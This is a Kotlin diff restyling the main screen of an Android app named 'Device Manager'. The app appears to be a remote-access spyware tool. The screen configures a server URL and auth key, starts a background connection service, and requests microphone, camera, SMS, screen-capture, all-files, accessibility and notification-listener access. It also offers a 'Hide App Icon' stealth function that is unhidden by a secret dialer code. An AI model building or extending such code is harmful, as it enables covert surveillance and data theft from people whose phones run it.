@@ -5,6 +5,7 @@ import android.app.Activity
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Color
+import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
 import android.media.projection.MediaProjectionManager
 import android.net.Uri
@@ -12,6 +13,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.provider.Settings
+import android.text.InputType
 import android.view.Gravity
 import android.widget.*
 import androidx.core.content.ContextCompat
@@ -19,91 +21,110 @@ import androidx.core.content.ContextCompat
 class MainActivity : Activity() {
 
     private lateinit var statusText: TextView
+    private lateinit var btnToggle: Button
+    private lateinit var btnGrantScreen: Button
+    private lateinit var btnAllFiles: Button
+    private lateinit var btnAccessibility: Button
+    private lateinit var btnNotifs: Button
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
         val scroll = ScrollView(this)
-        val ll = LinearLayout(this).apply {
+        val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            setPadding(40, 60, 40, 40)
-            setBackgroundColor(Color.parseColor("#050505"))
+            setPadding(48, 80, 48, 80)
+            setBackgroundColor(Color.parseColor("#121212")) // Deep Charcoal
         }
-        scroll.addView(ll)
+        scroll.addView(root)
         setContentView(scroll)
 
-        ll.addView(TextView(this).apply {
+        // Title
+        root.addView(TextView(this).apply {
             text = "Device Manager"
-            textSize = 28f
-            setTextColor(Color.parseColor("#00ff7a"))
+            textSize = 26f
+            setTextColor(Color.WHITE)
+            setTypeface(null, Typeface.BOLD)
             gravity = Gravity.CENTER
             setPadding(0, 0, 0, 40)
         })
 
-        ll.addView(TextView(this).apply { text = "Server URL"; setTextColor(Color.GRAY); textSize = 12f; setPadding(0,0,0,5) })
+        // --- CONFIG CARD ---
+        val configCard = createCard()
+        configCard.addView(TextView(this).apply { text = "Configuration"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,20) })
+        
         val serverEt = EditText(this).apply {
-            hint = "https://your-app.onrender.com"
+            hint = "Server URL"
             setText(Prefs.getServer(this@MainActivity))
             setTextColor(Color.WHITE)
-            setBackgroundColor(Color.parseColor("#111111"))
-            setPadding(20, 20, 20, 20)
+            setHintTextColor(Color.GRAY)
+            setBackgroundColor(Color.parseColor("#1E1E1E"))
+            setPadding(30, 30, 30, 30)
         }
-        ll.addView(serverEt)
+        configCard.addView(serverEt)
 
-        ll.addView(TextView(this).apply { text = "Auth Key (PSK)"; setTextColor(Color.GRAY); textSize = 12f; setPadding(0,20,0,5) })
         val pskEt = EditText(this).apply {
-            hint = "PSK"
+            hint = "Auth Key (PSK)"
             setText(Prefs.getPsk(this@MainActivity))
             setTextColor(Color.WHITE)
-            setBackgroundColor(Color.parseColor("#111111"))
-            setPadding(20, 20, 20, 20)
+            setHintTextColor(Color.GRAY)
+            setBackgroundColor(Color.parseColor("#1E1E1E"))
+            setPadding(30, 30, 30, 30)
+            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
+            setPadding(30, 30, 30, 30)
         }
-        ll.addView(pskEt)
+        configCard.addView(pskEt)
 
-        ll.addView(btn("Save Settings", "#00ff7a") {
+        configCard.addView(createBtn("Save Settings", "#323232", Color.WHITE) {
             Prefs.setServer(this@MainActivity, serverEt.text.toString().trim())
             Prefs.setPsk(this@MainActivity, pskEt.text.toString().trim())
             Toast.makeText(this@MainActivity, "Saved.", Toast.LENGTH_SHORT).show()
         })
+        root.addView(configCard)
 
+        // --- STATUS & SERVICE CARD ---
+        val statusCard = createCard()
+        statusCard.addView(TextView(this).apply { text = "Connection Status"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,10) })
+        
         statusText = TextView(this).apply {
-            setTextColor(Color.GRAY)
-            textSize = 14f
-            gravity = Gravity.CENTER
-            setPadding(0, 40, 0, 20)
+            setTextColor(Color.LTGRAY)
+            textSize = 13f
+            setPadding(0, 0, 0, 30)
+            lineSpacing = 1.5f
         }
-        ll.addView(statusText)
+        statusCard.addView(statusText)
 
-        val btnRow = LinearLayout(this).apply { orientation = LinearLayout.HORIZONTAL; gravity = Gravity.CENTER }
-        val btnStart = btn("▶ Start Service", "#00ff7a") {
-            if (Prefs.getServer(this@MainActivity).isBlank() || Prefs.getPsk(this@MainActivity).isBlank()) {
-                Toast.makeText(this@MainActivity, "Save settings first.", Toast.LENGTH_SHORT).show()
-                return@btn
-            }
-            ContextCompat.startForegroundService(this@MainActivity, Intent(this@MainActivity, ConnectionService::class.java))
-            updateStatus()
-        }
-        val btnStop = btn("■ Stop Service", "#ff4d4d") {
-            val intent = Intent(this@MainActivity, ConnectionService::class.java).apply { action = ConnectionService.ACTION_STOP }
-            startService(intent)
-            updateStatus()
-        }
-        btnRow.addView(btnStart, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f).apply { rightMargin = 10 })
-        btnRow.addView(btnStop, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f).apply { leftMargin = 10 })
-        ll.addView(btnRow)
+        btnToggle = createBtn("Start Service", "#00E676", Color.BLACK) { toggleService() }
+        statusCard.addView(btnToggle)
+        root.addView(statusCard)
 
-        ll.addView(TextView(this).apply { text = "Permissions & Access"; setTextColor(Color.parseColor("#00ff7a")); textSize = 18f; setPadding(0, 50, 0, 20) })
+        // --- PERMISSIONS CARD ---
+        val permCard = createCard()
+        permCard.addView(TextView(this).apply { text = "Permissions & Access"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,20) })
 
-        ll.addView(btn("Request Runtime Permissions") { requestPerms() })
-        ll.addView(btn("Grant Screen Capture") { requestScreenCapture() })
-        ll.addView(btn("Allow All Files Access (Android 11+)") { requestAllFiles() })
-        ll.addView(btn("Enable Accessibility Service") { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) })
-        ll.addView(btn("Enable Notification Listener") { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) })
+        permCard.addView(createBtn("Request Runtime Permissions", "#1E1E1E", Color.WHITE) { requestPerms() })
+        
+        btnGrantScreen = createBtn("Grant Screen Capture", "#1E1E1E", Color.WHITE) { requestScreenCapture() }
+        permCard.addView(btnGrantScreen)
 
-        ll.addView(btn("Hide App Icon", "#ff4d4d") {
+        btnAllFiles = createBtn("Allow All Files Access", "#1E1E1E", Color.WHITE) { requestAllFiles() }
+        permCard.addView(btnAllFiles)
+
+        btnAccessibility = createBtn("Enable Accessibility Service", "#1E1E1E", Color.WHITE) { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
+        permCard.addView(btnAccessibility)
+
+        btnNotifs = createBtn("Enable Notification Listener", "#1E1E1E", Color.WHITE) { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) }
+        permCard.addView(btnNotifs)
+        
+        root.addView(permCard)
+
+        // --- DANGER CARD ---
+        val dangerCard = createCard()
+        dangerCard.addView(createBtn("Hide App Icon", "#B71C1C", Color.WHITE) {
             StealthManager.hide(this@MainActivity)
             Toast.makeText(this@MainActivity, "Icon hidden. Dial *#*#1337#*#* to unhide.", Toast.LENGTH_LONG).show()
         })
+        root.addView(dangerCard)
     }
 
     override fun onResume() {
@@ -111,34 +132,87 @@ class MainActivity : Activity() {
         updateStatus()
     }
 
+    private fun toggleService() {
+        if (Prefs.isRunning(this)) {
+            val intent = Intent(this, ConnectionService::class.java).apply { action = ConnectionService.ACTION_STOP }
+            startService(intent)
+        } else {
+            if (Prefs.getServer(this).isBlank() || Prefs.getPsk(this).isBlank()) {
+                Toast.makeText(this, "Save settings first.", Toast.LENGTH_SHORT).show()
+                return
+            }
+            ContextCompat.startForegroundService(this, Intent(this, ConnectionService::class.java))
+        }
+        updateStatus()
+    }
+
     private fun updateStatus() {
+        val isRunning = Prefs.isRunning(this)
+        
+        // Update Toggle Button
+        if (isRunning) {
+            btnToggle.text = "STOP SERVICE"
+            btnToggle.background = getRoundRect("#FF5252") // Muted Coral
+            btnToggle.setTextColor(Color.WHITE)
+        } else {
+            btnToggle.text = "START SERVICE"
+            btnToggle.background = getRoundRect("#00E676") // Mint Green
+            btnToggle.setTextColor(Color.BLACK)
+        }
+
         val sb = StringBuilder()
-        sb.append(if (Prefs.isRunning(this)) "Service Status: RUNNING ✅\n" else "Service Status: STOPPED ❌\n\n")
-        sb.append(if (checkPerm(Manifest.permission.RECORD_AUDIO)) "Microphone: ✅\n" else "Microphone: ❌\n")
-        sb.append(if (checkPerm(Manifest.permission.CAMERA)) "Camera: ✅\n" else "Camera: ❌\n")
-        sb.append(if (checkPerm(Manifest.permission.READ_SMS)) "SMS/Calls: ✅\n" else "SMS/Calls: ❌\n")
-        sb.append(if (TouchService.instance != null) "Accessibility: ✅\n" else "Accessibility: ❌\n")
+        sb.append(if (checkPerm(Manifest.permission.RECORD_AUDIO)) "✅ Microphone\n" else "❌ Microphone\n")
+        sb.append(if (checkPerm(Manifest.permission.CAMERA)) "✅ Camera\n" else "❌ Camera\n")
+        sb.append(if (checkPerm(Manifest.permission.READ_SMS)) "✅ SMS & Calls\n" else "❌ SMS & Calls\n")
+        
+        val accEnabled = TouchService.instance != null
+        sb.append(if (accEnabled) "✅ Accessibility\n" else "❌ Accessibility\n")
+        
         val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
-        sb.append(if (notifEnabled) "Notifications: ✅\n" else "Notifications: ❌\n")
+        sb.append(if (notifEnabled) "✅ Notifications\n" else "❌ Notifications\n")
+        
         if (Build.VERSION.SDK_INT >= 30) {
-            sb.append(if (Environment.isExternalStorageManager()) "All Files Access: ✅" else "All Files Access: ❌")
+            sb.append(if (Environment.isExternalStorageManager()) "✅ All Files Access" else "❌ All Files Access")
         }
         statusText.text = sb.toString()
-        statusText.setTextColor(if (Prefs.isRunning(this)) Color.parseColor("#00ff7a") else Color.WHITE)
     }
 
     private fun checkPerm(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
 
-    private fun btn(label: String, colorStr: String = "#333333", onClick: () -> Unit): Button {
+    // --- UI HELPERS ---
+    private fun createCard(): LinearLayout {
+        return LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setBackgroundColor(Color.parseColor("#1E1E1E"))
+            setPadding(40, 40, 40, 40)
+            val params = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
+            params.setMargins(0, 0, 0, 40)
+            layoutParams = params
+            val bg = GradientDrawable()
+            bg.setColor(Color.parseColor("#1E1E1E"))
+            bg.cornerRadius = 40f
+            background = bg
+        }
+    }
+
+    private fun getRoundRect(colorHex: String): GradientDrawable {
+        val bg = GradientDrawable()
+        bg.setColor(Color.parseColor(colorHex))
+        bg.cornerRadius = 30f
+        return bg
+    }
+
+    private fun createBtn(label: String, bgColor: String, textColor: Int, onClick: () -> Unit): Button {
         return Button(this).apply {
             text = label
-            setTextColor(if (colorStr == "#333333") Color.WHITE else Color.BLACK)
-            val bg = GradientDrawable()
-            bg.setColor(Color.parseColor(colorStr))
-            bg.cornerRadius = 20f
-            background = bg
-            setPadding(0, 30, 0, 30)
+            setTextColor(textColor)
+            background = getRoundRect(bgColor)
+            setPadding(0, 35, 0, 35)
+            setTypeface(null, Typeface.BOLD)
             setOnClickListener { onClick() }
+            val params = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
+            params.setMargins(0, 15, 0, 0)
+            layoutParams = params
         }
     }
 
